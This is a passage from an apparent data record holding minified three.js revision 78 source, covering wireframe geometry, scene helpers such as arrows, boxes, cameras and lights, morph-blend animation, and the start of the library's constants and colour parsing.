c=[0,0],d={},e=[\"a\",\"b\",\"c\"];if(a instanceof THREE.Geometry){var f=a.vertices,g=a.faces,h=0,k=new Uint32Array(6*g.length);a=0;for(var l=g.length;a<l;a++)for(var n=g[a],p=0;3>p;p++){c[0]=n[e[p]];c[1]=n[e[(p+1)%3]];c.sort(b);var m=c.toString();void 0===d[m]&&(k[2*h]=c[0],k[2*h+1]=c[1],d[m]=!0,h++)}c=new Float32Array(6*h);a=0;for(l=h;a<l;a++)for(p=0;2>p;p++)d=f[k[2*a+p]],h=6*a+3*p,c[h+0]=d.x,c[h+1]=d.y,\nc[h+2]=d.z;this.addAttribute(\"position\",new THREE.BufferAttribute(c,3))}else if(a instanceof THREE.BufferGeometry){if(null!==a.index){l=a.index.array;f=a.attributes.position;e=a.groups;h=0;0===e.length&&a.addGroup(0,l.length);k=new Uint32Array(2*l.length);g=0;for(n=e.length;g<n;++g){a=e[g];p=a.start;m=a.count;a=p;for(var q=p+m;a<q;a+=3)for(p=0;3>p;p++)c[0]=l[a+p],c[1]=l[a+(p+1)%3],c.sort(b),m=c.toString(),void 0===d[m]&&(k[2*h]=c[0],k[2*h+1]=c[1],d[m]=!0,h++)}c=new Float32Array(6*h);a=0;for(l=h;a<\nl;a++)for(p=0;2>p;p++)h=6*a+3*p,d=k[2*a+p],c[h+0]=f.getX(d),c[h+1]=f.getY(d),c[h+2]=f.getZ(d)}else for(f=a.attributes.position.array,h=f.length/3,k=h/3,c=new Float32Array(6*h),a=0,l=k;a<l;a++)for(p=0;3>p;p++)h=18*a+6*p,k=9*a+3*p,c[h+0]=f[k],c[h+1]=f[k+1],c[h+2]=f[k+2],d=9*a+(p+1)%3*3,c[h+3]=f[d],c[h+4]=f[d+1],c[h+5]=f[d+2];this.addAttribute(\"position\",new THREE.BufferAttribute(c,3))}};THREE.WireframeGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);\nTHREE.WireframeGeometry.prototype.constructor=THREE.WireframeGeometry;THREE.AxisHelper=function(a){a=a||1;var b=new Float32Array([0,0,0,a,0,0,0,0,0,0,a,0,0,0,0,0,0,a]),c=new Float32Array([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1]);a=new THREE.BufferGeometry;a.addAttribute(\"position\",new THREE.BufferAttribute(b,3));a.addAttribute(\"color\",new THREE.BufferAttribute(c,3));b=new THREE.LineBasicMaterial({vertexColors:THREE.VertexColors});THREE.LineSegments.call(this,a,b)};THREE.AxisHelper.prototype=Object.create(THREE.LineSegments.prototype);\nTHREE.AxisHelper.prototype.constructor=THREE.AxisHelper;\nTHREE.ArrowHelper=function(){var a=new THREE.BufferGeometry;a.addAttribute(\"position\",new THREE.Float32Attribute([0,0,0,0,1,0],3));var b=new THREE.CylinderBufferGeometry(0,.5,1,5,1);b.translate(0,-.5,0);return function(c,d,e,f,g,h){THREE.Object3D.call(this);void 0===f&&(f=16776960);void 0===e&&(e=1);void 0===g&&(g=.2*e);void 0===h&&(h=.2*g);this.position.copy(d);this.line=new THREE.Line(a,new THREE.LineBasicMaterial({color:f}));this.line.matrixAutoUpdate=!1;this.add(this.line);this.cone=new THREE.Mesh(b,\nnew THREE.MeshBasicMaterial({color:f}));this.cone.matrixAutoUpdate=!1;this.add(this.cone);this.setDirection(c);this.setLength(e,g,h)}}();THREE.ArrowHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.ArrowHelper.prototype.constructor=THREE.ArrowHelper;\nTHREE.ArrowHelper.prototype.setDirection=function(){var a=new THREE.Vector3,b;return function(c){.99999<c.y?this.quaternion.set(0,0,0,1):-.99999>c.y?this.quaternion.set(1,0,0,0):(a.set(c.z,0,-c.x).normalize(),b=Math.acos(c.y),this.quaternion.setFromAxisAngle(a,b))}}();THREE.ArrowHelper.prototype.setLength=function(a,b,c){void 0===b&&(b=.2*a);void 0===c&&(c=.2*b);this.line.scale.set(1,Math.max(0,a-b),1);this.line.updateMatrix();this.cone.scale.set(c,b,c);this.cone.position.y=a;this.cone.updateMatrix()};\nTHREE.ArrowHelper.prototype.setColor=function(a){this.line.material.color.copy(a);this.cone.material.color.copy(a)};THREE.BoxHelper=function(a,b){void 0===b&&(b=16776960);var c=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),d=new Float32Array(24),e=new THREE.BufferGeometry;e.setIndex(new THREE.BufferAttribute(c,1));e.addAttribute(\"position\",new THREE.BufferAttribute(d,3));THREE.LineSegments.call(this,e,new THREE.LineBasicMaterial({color:b}));void 0!==a&&this.update(a)};\nTHREE.BoxHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.BoxHelper.prototype.constructor=THREE.BoxHelper;\nTHREE.BoxHelper.prototype.update=function(){var a=new THREE.Box3;return function(b){b instanceof THREE.Box3?a.copy(b):a.setFromObject(b);if(!a.isEmpty()){b=a.min;var c=a.max,d=this.geometry.attributes.position,e=d.array;e[0]=c.x;e[1]=c.y;e[2]=c.z;e[3]=b.x;e[4]=c.y;e[5]=c.z;e[6]=b.x;e[7]=b.y;e[8]=c.z;e[9]=c.x;e[10]=b.y;e[11]=c.z;e[12]=c.x;e[13]=c.y;e[14]=b.z;e[15]=b.x;e[16]=c.y;e[17]=b.z;e[18]=b.x;e[19]=b.y;e[20]=b.z;e[21]=c.x;e[22]=b.y;e[23]=b.z;d.needsUpdate=!0;this.geometry.computeBoundingSphere()}}}();\nTHREE.BoundingBoxHelper=function(a,b){var c=void 0!==b?b:8947848;this.object=a;this.box=new THREE.Box3;THREE.Mesh.call(this,new THREE.BoxGeometry(1,1,1),new THREE.MeshBasicMaterial({color:c,wireframe:!0}))};THREE.BoundingBoxHelper.prototype=Object.create(THREE.Mesh.prototype);THREE.BoundingBoxHelper.prototype.constructor=THREE.BoundingBoxHelper;THREE.BoundingBoxHelper.prototype.update=function(){this.box.setFromObject(this.object);this.box.size(this.scale);this.box.center(this.position)};\nTHREE.CameraHelper=function(a){function b(a,b,d){c(a,d);c(b,d)}function c(a,b){d.vertices.push(new THREE.Vector3);d.colors.push(new THREE.Color(b));void 0===f[a]&&(f[a]=[]);f[a].push(d.vertices.length-1)}var d=new THREE.Geometry,e=new THREE.LineBasicMaterial({color:16777215,vertexColors:THREE.FaceColors}),f={};b(\"n1\",\"n2\",16755200);b(\"n2\",\"n4\",16755200);b(\"n4\",\"n3\",16755200);b(\"n3\",\"n1\",16755200);b(\"f1\",\"f2\",16755200);b(\"f2\",\"f4\",16755200);b(\"f4\",\"f3\",16755200);b(\"f3\",\"f1\",16755200);b(\"n1\",\"f1\",16755200);\nb(\"n2\",\"f2\",16755200);b(\"n3\",\"f3\",16755200);b(\"n4\",\"f4\",16755200);b(\"p\",\"n1\",16711680);b(\"p\",\"n2\",16711680);b(\"p\",\"n3\",16711680);b(\"p\",\"n4\",16711680);b(\"u1\",\"u2\",43775);b(\"u2\",\"u3\",43775);b(\"u3\",\"u1\",43775);b(\"c\",\"t\",16777215);b(\"p\",\"c\",3355443);b(\"cn1\",\"cn2\",3355443);b(\"cn3\",\"cn4\",3355443);b(\"cf1\",\"cf2\",3355443);b(\"cf3\",\"cf4\",3355443);THREE.LineSegments.call(this,d,e);this.camera=a;this.camera.updateProjectionMatrix&&this.camera.updateProjectionMatrix();this.matrix=a.matrixWorld;this.matrixAutoUpdate=\n!1;this.pointMap=f;this.update()};THREE.CameraHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.CameraHelper.prototype.constructor=THREE.CameraHelper;\nTHREE.CameraHelper.prototype.update=function(){function a(a,g,h,k){d.set(g,h,k).unproject(e);a=c[a];if(void 0!==a)for(g=0,h=a.length;g<h;g++)b.vertices[a[g]].copy(d)}var b,c,d=new THREE.Vector3,e=new THREE.Camera;return function(){b=this.geometry;c=this.pointMap;e.projectionMatrix.copy(this.camera.projectionMatrix);a(\"c\",0,0,-1);a(\"t\",0,0,1);a(\"n1\",-1,-1,-1);a(\"n2\",1,-1,-1);a(\"n3\",-1,1,-1);a(\"n4\",1,1,-1);a(\"f1\",-1,-1,1);a(\"f2\",1,-1,1);a(\"f3\",-1,1,1);a(\"f4\",1,1,1);a(\"u1\",.7,1.1,-1);a(\"u2\",-.7,1.1,\n-1);a(\"u3\",0,2,-1);a(\"cf1\",-1,0,1);a(\"cf2\",1,0,1);a(\"cf3\",0,-1,1);a(\"cf4\",0,1,1);a(\"cn1\",-1,0,-1);a(\"cn2\",1,0,-1);a(\"cn3\",0,-1,-1);a(\"cn4\",0,1,-1);b.verticesNeedUpdate=!0}}();\nTHREE.DirectionalLightHelper=function(a,b){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;void 0===b&&(b=1);var c=new THREE.BufferGeometry;c.addAttribute(\"position\",new THREE.Float32Attribute([-b,b,0,b,b,0,b,-b,0,-b,-b,0,-b,b,0],3));var d=new THREE.LineBasicMaterial({fog:!1});this.add(new THREE.Line(c,d));c=new THREE.BufferGeometry;c.addAttribute(\"position\",new THREE.Float32Attribute([0,0,0,0,0,1],3));this.add(new THREE.Line(c,\nd));this.update()};THREE.DirectionalLightHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.DirectionalLightHelper.prototype.constructor=THREE.DirectionalLightHelper;THREE.DirectionalLightHelper.prototype.dispose=function(){var a=this.children[0],b=this.children[1];a.geometry.dispose();a.material.dispose();b.geometry.dispose();b.material.dispose()};\nTHREE.DirectionalLightHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3;return function(){a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);c.subVectors(b,a);var d=this.children[0],e=this.children[1];d.lookAt(c);d.material.color.copy(this.light.color).multiplyScalar(this.light.intensity);e.lookAt(c);e.scale.z=c.length()}}();\nTHREE.EdgesHelper=function(a,b,c){b=void 0!==b?b:16777215;THREE.LineSegments.call(this,new THREE.EdgesGeometry(a.geometry,c),new THREE.LineBasicMaterial({color:b}));this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1};THREE.EdgesHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.EdgesHelper.prototype.constructor=THREE.EdgesHelper;\nTHREE.FaceNormalsHelper=function(a,b,c,d){this.object=a;this.size=void 0!==b?b:1;a=void 0!==c?c:16776960;d=void 0!==d?d:1;b=0;c=this.object.geometry;c instanceof THREE.Geometry?b=c.faces.length:console.warn(\"THREE.FaceNormalsHelper: only THREE.Geometry is supported. Use THREE.VertexNormalsHelper, instead.\");c=new THREE.BufferGeometry;b=new THREE.Float32Attribute(6*b,3);c.addAttribute(\"position\",b);THREE.LineSegments.call(this,c,new THREE.LineBasicMaterial({color:a,linewidth:d}));this.matrixAutoUpdate=\n!1;this.update()};THREE.FaceNormalsHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.FaceNormalsHelper.prototype.constructor=THREE.FaceNormalsHelper;\nTHREE.FaceNormalsHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Matrix3;return function(){this.object.updateMatrixWorld(!0);c.getNormalMatrix(this.object.matrixWorld);for(var d=this.object.matrixWorld,e=this.geometry.attributes.position,f=this.object.geometry,g=f.vertices,f=f.faces,h=0,k=0,l=f.length;k<l;k++){var n=f[k],p=n.normal;a.copy(g[n.a]).add(g[n.b]).add(g[n.c]).divideScalar(3).applyMatrix4(d);b.copy(p).applyMatrix3(c).normalize().multiplyScalar(this.size).add(a);\ne.setXYZ(h,a.x,a.y,a.z);h+=1;e.setXYZ(h,b.x,b.y,b.z);h+=1}e.needsUpdate=!0;return this}}();\nTHREE.GridHelper=function(a,b,c,d){c=new THREE.Color(void 0!==c?c:4473924);d=new THREE.Color(void 0!==d?d:8947848);for(var e=[],f=[],g=-a,h=0;g<=a;g+=b){e.push(-a,0,g,a,0,g);e.push(g,0,-a,g,0,a);var k=0===g?c:d;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3}a=new THREE.BufferGeometry;a.addAttribute(\"position\",new THREE.Float32Attribute(e,3));a.addAttribute(\"color\",new THREE.Float32Attribute(f,3));e=new THREE.LineBasicMaterial({vertexColors:THREE.VertexColors});THREE.LineSegments.call(this,\na,e)};THREE.GridHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.GridHelper.prototype.constructor=THREE.GridHelper;THREE.GridHelper.prototype.setColors=function(){console.error(\"THREE.GridHelper: setColors() has been deprecated, pass them in the constructor instead.\")};\nTHREE.HemisphereLightHelper=function(a,b){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;this.colors=[new THREE.Color,new THREE.Color];var c=new THREE.SphereGeometry(b,4,2);c.rotateX(-Math.PI/2);for(var d=0;8>d;d++)c.faces[d].color=this.colors[4>d?0:1];d=new THREE.MeshBasicMaterial({vertexColors:THREE.FaceColors,wireframe:!0});this.lightSphere=new THREE.Mesh(c,d);this.add(this.lightSphere);this.update()};\nTHREE.HemisphereLightHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.HemisphereLightHelper.prototype.constructor=THREE.HemisphereLightHelper;THREE.HemisphereLightHelper.prototype.dispose=function(){this.lightSphere.geometry.dispose();this.lightSphere.material.dispose()};\nTHREE.HemisphereLightHelper.prototype.update=function(){var a=new THREE.Vector3;return function(){this.colors[0].copy(this.light.color).multiplyScalar(this.light.intensity);this.colors[1].copy(this.light.groundColor).multiplyScalar(this.light.intensity);this.lightSphere.lookAt(a.setFromMatrixPosition(this.light.matrixWorld).negate());this.lightSphere.geometry.colorsNeedUpdate=!0}}();\nTHREE.PointLightHelper=function(a,b){this.light=a;this.light.updateMatrixWorld();var c=new THREE.SphereBufferGeometry(b,4,2),d=new THREE.MeshBasicMaterial({wireframe:!0,fog:!1});d.color.copy(this.light.color).multiplyScalar(this.light.intensity);THREE.Mesh.call(this,c,d);this.matrix=this.light.matrixWorld;this.matrixAutoUpdate=!1};THREE.PointLightHelper.prototype=Object.create(THREE.Mesh.prototype);THREE.PointLightHelper.prototype.constructor=THREE.PointLightHelper;\nTHREE.PointLightHelper.prototype.dispose=function(){this.geometry.dispose();this.material.dispose()};THREE.PointLightHelper.prototype.update=function(){this.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)};\nTHREE.SkeletonHelper=function(a){this.bones=this.getBoneList(a);for(var b=new THREE.Geometry,c=0;c<this.bones.length;c++)this.bones[c].parent instanceof THREE.Bone&&(b.vertices.push(new THREE.Vector3),b.vertices.push(new THREE.Vector3),b.colors.push(new THREE.Color(0,0,1)),b.colors.push(new THREE.Color(0,1,0)));b.dynamic=!0;c=new THREE.LineBasicMaterial({vertexColors:THREE.VertexColors,depthTest:!1,depthWrite:!1,transparent:!0});THREE.LineSegments.call(this,b,c);this.root=a;this.matrix=a.matrixWorld;\nthis.matrixAutoUpdate=!1;this.update()};THREE.SkeletonHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.SkeletonHelper.prototype.constructor=THREE.SkeletonHelper;THREE.SkeletonHelper.prototype.getBoneList=function(a){var b=[];a instanceof THREE.Bone&&b.push(a);for(var c=0;c<a.children.length;c++)b.push.apply(b,this.getBoneList(a.children[c]));return b};\nTHREE.SkeletonHelper.prototype.update=function(){for(var a=this.geometry,b=(new THREE.Matrix4).getInverse(this.root.matrixWorld),c=new THREE.Matrix4,d=0,e=0;e<this.bones.length;e++){var f=this.bones[e];f.parent instanceof THREE.Bone&&(c.multiplyMatrices(b,f.matrixWorld),a.vertices[d].setFromMatrixPosition(c),c.multiplyMatrices(b,f.parent.matrixWorld),a.vertices[d+1].setFromMatrixPosition(c),d+=2)}a.verticesNeedUpdate=!0;a.computeBoundingSphere()};\nTHREE.SpotLightHelper=function(a){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;a=new THREE.BufferGeometry;for(var b=[0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,-1,0,1,0,0,0,0,1,1,0,0,0,0,-1,1],c=0,d=1;32>c;c++,d++){var e=c/32*Math.PI*2,f=d/32*Math.PI*2;b.push(Math.cos(e),Math.sin(e),1,Math.cos(f),Math.sin(f),1)}a.addAttribute(\"position\",new THREE.Float32Attribute(b,3));b=new THREE.LineBasicMaterial({fog:!1});this.cone=new THREE.LineSegments(a,\nb);this.add(this.cone);this.update()};THREE.SpotLightHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.SpotLightHelper.prototype.constructor=THREE.SpotLightHelper;THREE.SpotLightHelper.prototype.dispose=function(){this.cone.geometry.dispose();this.cone.material.dispose()};\nTHREE.SpotLightHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(){var c=this.light.distance?this.light.distance:1E3,d=c*Math.tan(this.light.angle);this.cone.scale.set(d,d,c);a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);this.cone.lookAt(b.sub(a));this.cone.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)}}();\nTHREE.VertexNormalsHelper=function(a,b,c,d){this.object=a;this.size=void 0!==b?b:1;a=void 0!==c?c:16711680;d=void 0!==d?d:1;b=0;c=this.object.geometry;c instanceof THREE.Geometry?b=3*c.faces.length:c instanceof THREE.BufferGeometry&&(b=c.attributes.normal.count);c=new THREE.BufferGeometry;b=new THREE.Float32Attribute(6*b,3);c.addAttribute(\"position\",b);THREE.LineSegments.call(this,c,new THREE.LineBasicMaterial({color:a,linewidth:d}));this.matrixAutoUpdate=!1;this.update()};\nTHREE.VertexNormalsHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.VertexNormalsHelper.prototype.constructor=THREE.VertexNormalsHelper;\nTHREE.VertexNormalsHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Matrix3;return function(){var d=[\"a\",\"b\",\"c\"];this.object.updateMatrixWorld(!0);c.getNormalMatrix(this.object.matrixWorld);var e=this.object.matrixWorld,f=this.geometry.attributes.position,g=this.object.geometry;if(g instanceof THREE.Geometry)for(var h=g.vertices,k=g.faces,l=g=0,n=k.length;l<n;l++)for(var p=k[l],m=0,q=p.vertexNormals.length;m<q;m++){var r=p.vertexNormals[m];a.copy(h[p[d[m]]]).applyMatrix4(e);\nb.copy(r).applyMatrix3(c).normalize().multiplyScalar(this.size).add(a);f.setXYZ(g,a.x,a.y,a.z);g+=1;f.setXYZ(g,b.x,b.y,b.z);g+=1}else if(g instanceof THREE.BufferGeometry)for(d=g.attributes.position,h=g.attributes.normal,m=g=0,q=d.count;m<q;m++)a.set(d.getX(m),d.getY(m),d.getZ(m)).applyMatrix4(e),b.set(h.getX(m),h.getY(m),h.getZ(m)),b.applyMatrix3(c).normalize().multiplyScalar(this.size).add(a),f.setXYZ(g,a.x,a.y,a.z),g+=1,f.setXYZ(g,b.x,b.y,b.z),g+=1;f.needsUpdate=!0;return this}}();\nTHREE.WireframeHelper=function(a,b){var c=void 0!==b?b:16777215;THREE.LineSegments.call(this,new THREE.WireframeGeometry(a.geometry),new THREE.LineBasicMaterial({color:c}));this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1};THREE.WireframeHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.WireframeHelper.prototype.constructor=THREE.WireframeHelper;THREE.ImmediateRenderObject=function(a){THREE.Object3D.call(this);this.material=a;this.render=function(a){}};\nTHREE.ImmediateRenderObject.prototype=Object.create(THREE.Object3D.prototype);THREE.ImmediateRenderObject.prototype.constructor=THREE.ImmediateRenderObject;THREE.MorphBlendMesh=function(a,b){THREE.Mesh.call(this,a,b);this.animationsMap={};this.animationsList=[];var c=this.geometry.morphTargets.length;this.createAnimation(\"__default\",0,c-1,c/1);this.setAnimationWeight(\"__default\",1)};THREE.MorphBlendMesh.prototype=Object.create(THREE.Mesh.prototype);THREE.MorphBlendMesh.prototype.constructor=THREE.MorphBlendMesh;\nTHREE.MorphBlendMesh.prototype.createAnimation=function(a,b,c,d){b={start:b,end:c,length:c-b+1,fps:d,duration:(c-b)/d,lastFrame:0,currentFrame:0,active:!1,time:0,direction:1,weight:1,directionBackwards:!1,mirroredLoop:!1};this.animationsMap[a]=b;this.animationsList.push(b)};\nTHREE.MorphBlendMesh.prototype.autoCreateAnimations=function(a){for(var b=/([a-z]+)_?(\\d+)/i,c,d={},e=this.geometry,f=0,g=e.morphTargets.length;f<g;f++){var h=e.morphTargets[f].name.match(b);if(h&&1<h.length){var k=h[1];d[k]||(d[k]={start:Infinity,end:-Infinity});h=d[k];f<h.start&&(h.start=f);f>h.end&&(h.end=f);c||(c=k)}}for(k in d)h=d[k],this.createAnimation(k,h.start,h.end,a);this.firstAnimation=c};\nTHREE.MorphBlendMesh.prototype.setAnimationDirectionForward=function(a){if(a=this.animationsMap[a])a.direction=1,a.directionBackwards=!1};THREE.MorphBlendMesh.prototype.setAnimationDirectionBackward=function(a){if(a=this.animationsMap[a])a.direction=-1,a.directionBackwards=!0};THREE.MorphBlendMesh.prototype.setAnimationFPS=function(a,b){var c=this.animationsMap[a];c&&(c.fps=b,c.duration=(c.end-c.start)/c.fps)};\nTHREE.MorphBlendMesh.prototype.setAnimationDuration=function(a,b){var c=this.animationsMap[a];c&&(c.duration=b,c.fps=(c.end-c.start)/c.duration)};THREE.MorphBlendMesh.prototype.setAnimationWeight=function(a,b){var c=this.animationsMap[a];c&&(c.weight=b)};THREE.MorphBlendMesh.prototype.setAnimationTime=function(a,b){var c=this.animationsMap[a];c&&(c.time=b)};THREE.MorphBlendMesh.prototype.getAnimationTime=function(a){var b=0;if(a=this.animationsMap[a])b=a.time;return b};\nTHREE.MorphBlendMesh.prototype.getAnimationDuration=function(a){var b=-1;if(a=this.animationsMap[a])b=a.duration;return b};THREE.MorphBlendMesh.prototype.playAnimation=function(a){var b=this.animationsMap[a];b?(b.time=0,b.active=!0):console.warn(\"THREE.MorphBlendMesh: animation[\"+a+\"] undefined in .playAnimation()\")};THREE.MorphBlendMesh.prototype.stopAnimation=function(a){if(a=this.animationsMap[a])a.active=!1};\nTHREE.MorphBlendMesh.prototype.update=function(a){for(var b=0,c=this.animationsList.length;b<c;b++){var d=this.animationsList[b];if(d.active){var e=d.duration/d.length;d.time+=d.direction*a;if(d.mirroredLoop){if(d.time>d.duration||0>d.time)d.direction*=-1,d.time>d.duration&&(d.time=d.duration,d.directionBackwards=!0),0>d.time&&(d.time=0,d.directionBackwards=!1)}else d.time%=d.duration,0>d.time&&(d.time+=d.duration);var f=d.start+THREE.Math.clamp(Math.floor(d.time/e),0,d.length-1),g=d.weight;f!==d.currentFrame&&\n(this.morphTargetInfluences[d.lastFrame]=0,this.morphTargetInfluences[d.currentFrame]=1*g,this.morphTargetInfluences[f]=0,d.lastFrame=d.currentFrame,d.currentFrame=f);e=d.time%e/e;d.directionBackwards&&(e=1-e);d.currentFrame!==d.lastFrame?(this.morphTargetInfluences[d.currentFrame]=e*g,this.morphTargetInfluences[d.lastFrame]=(1-e)*g):this.morphTargetInfluences[d.currentFrame]=g}}};\n","source":"libs/webGL/a10/three.min.js","raw":"// threejs.org/license\n'use strict';var THREE={REVISION:\"78\"};\"function\"===typeof define&&define.amd?define(\"three\",THREE):\"undefined\"!==typeof exports&&\"undefined\"!==typeof module&&(module.exports=THREE);void 0===Number.EPSILON&&(Number.EPSILON=Math.pow(2,-52));void 0===Math.sign&&(Math.sign=function(a){return 0>a?-1:0<a?1:+a});void 0===Function.prototype.name&&Object.defineProperty(Function.prototype,\"name\",{get:function(){return this.toString().match(/^\\s*function\\s*(\\S*)\\s*\\(/)[1]}});\nvoid 0===Object.assign&&function(){Object.assign=function(a){if(void 0===a||null===a)throw new TypeError(\"Cannot convert undefined or null to object\");for(var b=Object(a),c=1;c<arguments.length;c++){var d=arguments[c];if(void 0!==d&&null!==d)for(var e in d)Object.prototype.hasOwnProperty.call(d,e)&&(b[e]=d[e])}return b}}();\nObject.assign(THREE,{MOUSE:{LEFT:0,MIDDLE:1,RIGHT:2},CullFaceNone:0,CullFaceBack:1,CullFaceFront:2,CullFaceFrontBack:3,FrontFaceDirectionCW:0,FrontFaceDirectionCCW:1,BasicShadowMap:0,PCFShadowMap:1,PCFSoftShadowMap:2,FrontSide:0,BackSide:1,DoubleSide:2,FlatShading:1,SmoothShading:2,NoColors:0,FaceColors:1,VertexColors:2,NoBlending:0,NormalBlending:1,AdditiveBlending:2,SubtractiveBlending:3,MultiplyBlending:4,CustomBlending:5,AddEquation:100,SubtractEquation:101,ReverseSubtractEquation:102,MinEquation:103,\nMaxEquation:104,ZeroFactor:200,OneFactor:201,SrcColorFactor:202,OneMinusSrcColorFactor:203,SrcAlphaFactor:204,OneMinusSrcAlphaFactor:205,DstAlphaFactor:206,OneMinusDstAlphaFactor:207,DstColorFactor:208,OneMinusDstColorFactor:209,SrcAlphaSaturateFactor:210,NeverDepth:0,AlwaysDepth:1,LessDepth:2,LessEqualDepth:3,EqualDepth:4,GreaterEqualDepth:5,GreaterDepth:6,NotEqualDepth:7,MultiplyOperation:0,MixOperation:1,AddOperation:2,NoToneMapping:0,LinearToneMapping:1,ReinhardToneMapping:2,Uncharted2ToneMapping:3,\nCineonToneMapping:4,UVMapping:300,CubeReflectionMapping:301,CubeRefractionMapping:302,EquirectangularReflectionMapping:303,EquirectangularRefractionMapping:304,SphericalReflectionMapping:305,CubeUVReflectionMapping:306,CubeUVRefractionMapping:307,RepeatWrapping:1E3,ClampToEdgeWrapping:1001,MirroredRepeatWrapping:1002,NearestFilter:1003,NearestMipMapNearestFilter:1004,NearestMipMapLinearFilter:1005,LinearFilter:1006,LinearMipMapNearestFilter:1007,LinearMipMapLinearFilter:1008,UnsignedByteType:1009,\nByteType:1010,ShortType:1011,UnsignedShortType:1012,IntType:1013,UnsignedIntType:1014,FloatType:1015,HalfFloatType:1025,UnsignedShort4444Type:1016,UnsignedShort5551Type:1017,UnsignedShort565Type:1018,AlphaFormat:1019,RGBFormat:1020,RGBAFormat:1021,LuminanceFormat:1022,LuminanceAlphaFormat:1023,RGBEFormat:THREE.RGBAFormat,DepthFormat:1026,RGB_S3TC_DXT1_Format:2001,RGBA_S3TC_DXT1_Format:2002,RGBA_S3TC_DXT3_Format:2003,RGBA_S3TC_DXT5_Format:2004,RGB_PVRTC_4BPPV1_Format:2100,RGB_PVRTC_2BPPV1_Format:2101,\nRGBA_PVRTC_4BPPV1_Format:2102,RGBA_PVRTC_2BPPV1_Format:2103,RGB_ETC1_Format:2151,LoopOnce:2200,LoopRepeat:2201,LoopPingPong:2202,InterpolateDiscrete:2300,InterpolateLinear:2301,InterpolateSmooth:2302,ZeroCurvatureEnding:2400,ZeroSlopeEnding:2401,WrapAroundEnding:2402,TrianglesDrawMode:0,TriangleStripDrawMode:1,TriangleFanDrawMode:2,LinearEncoding:3E3,sRGBEncoding:3001,GammaEncoding:3007,RGBEEncoding:3002,LogLuvEncoding:3003,RGBM7Encoding:3004,RGBM16Encoding:3005,RGBDEncoding:3006,BasicDepthPacking:3200,\nRGBADepthPacking:3201});THREE.Color=function(a,b,c){return void 0===b&&void 0===c?this.set(a):this.setRGB(a,b,c)};\nTHREE.Color.prototype={constructor:THREE.Color,r:1,g:1,b:1,set:function(a){a instanceof THREE.Color?this.copy(a):\"number\"===typeof a?this.setHex(a):\"string\"===typeof a&&this.setStyle(a);return this},setScalar:function(a){this.b=this.g=this.r=a},setHex:function(a){a=Math.floor(a);this.r=(a>>16&255)/255;this.g=(a>>8&255)/255;this.b=(a&255)/255;return this},setRGB:function(a,b,c){this.r=a;this.g=b;this.b=c;return this},setHSL:function(){function a(a,c,d){0>d&&(d+=1);1<d&&(d-=1);return d<1/6?a+6*(c-a)*\nd:.5>d?c:d<2/3?a+6*(c-a)*(2/3-d):a}return function(b,c,d){b=THREE.Math.euclideanModulo(b,1);c=THREE.Math.clamp(c,0,1);d=THREE.Math.clamp(d,0,1);0===c?this.r=this.g=this.b=d:(c=.5>=d?d*(1+c):d+c-d*c,d=2*d-c,this.r=a(d,c,b+1/3),this.g=a(d,c,b),this.b=a(d,c,b-1/3));return this}}(),setStyle:function(a){function b(b){void 0!==b&&1>parseFloat(b)&&console.warn(\"THREE.Color: Alpha component of \"+a+\" will be ignored.\")}var c;if(c=/^((?:rgb|hsl)a?)\\(\\s*([^\\)]*)\\)/.exec(a)){var d=c[2];switch(c[1]){case \"rgb\":case \"rgba\":if(c=\n/^(\\d+)\\s*,\\s*(\\d+)\\s*,\\s*(\\d+)\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(255,parseInt(c[1],10))/255,this.g=Math.min(255,parseInt(c[2],10))/255,this.b=Math.min(255,parseInt(c[3],10))/255,b(c[5]),this;if(c=/^(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(100,parseInt(c[1],10))/100,this.g=Math.min(100,parseInt(c[2],10))/100,this.b=Math.min(100,parseInt(c[3],10))/100,b(c[5]),this;break;case \"hsl\":case \"hsla\":if(c=/^([0-9]*\\.?[0-9]+)\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d)){var d=\nparseFloat(c[1])/360,e=parseInt(c[2],10)/100,f=parseInt(c[3],10)/100;b(c[5]);return this.setHSL(d,e,f)}}}else if(c=/^\\#([A-Fa-f0-9]+)$/.exec(a)){c=c[1];d=c.length;if(3===d)return 